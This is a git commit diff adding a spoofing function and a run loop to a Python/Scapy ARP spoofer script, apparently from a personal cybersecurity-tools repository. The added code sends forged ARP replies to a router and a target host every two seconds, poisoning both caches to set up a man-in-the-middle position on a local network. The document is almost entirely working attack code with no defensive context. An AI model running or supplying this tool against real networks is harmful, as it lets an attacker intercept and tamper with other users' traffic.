95ad5a9c7fc8f91768c24a91808cfe60c5e1f6f9
Arpit <arpitjaiswal9526@gmail.com>
2023-12-22 20:49:21 +0530

    Currently in development

--- cybersecuritytools/spidermaking/arpspoofer.py
+++ cybersecuritytools/spidermaking/arpspoofer.py
@@ -10,6 +10,12 @@ def get_mac_address(ip_address):
     answer = srp(get_mac_packet, timeout=2, verbose=False)[0]
     return answer[0][1].hwsrc
 
+def spoof(router_ip, target_ip, router_mac, target_mac):
+    packet1 = ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
+    packet2 = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
+    send(packet1)
+    send(packet2)
+
 target_ip = str(sys.argv[2])
 router_ip = str(sys.argv[1])
 
@@ -18,3 +24,12 @@ router_mac = str(get_mac_address(router_ip))
 
 print(router_mac)
 print(target_mac)
+
+try:
+    while True:
+        spoof(router_ip, target_ip, router_mac, target_mac)
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("Closing ARP spoofer")
+    exit(0)
